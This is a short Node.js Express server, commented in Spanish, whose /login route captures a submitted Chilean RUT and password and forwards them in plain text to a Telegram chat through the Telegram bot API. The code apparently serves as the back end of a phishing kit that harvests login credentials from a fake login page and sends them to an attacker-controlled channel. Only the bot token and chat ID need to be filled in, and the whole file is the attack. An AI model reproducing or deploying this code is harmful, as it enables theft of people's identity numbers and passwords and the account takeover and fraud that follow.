const express = require("express");
const fetch = require("node-fetch");
const app = express();

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Reemplaza con tu token y chat ID
const TELEGRAM_TOKEN = "TU_TOKEN_AQUI";
const CHAT_ID = "TU_CHAT_ID_AQUI";

app.post("/login", async (req, res) => {
  const { rut, passwd } = req.body;

  const mensaje = `Nuevo intento de login:\nRUT: ${rut}\nContraseña: ${passwd}`;

  await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ chat_id: CHAT_ID, text: mensaje })
  });

  res.send("✅ Credenciales enviadas a Telegram.");
});

app.listen(3000, () => console.log("Servidor corriendo en http://localhost:3000"));
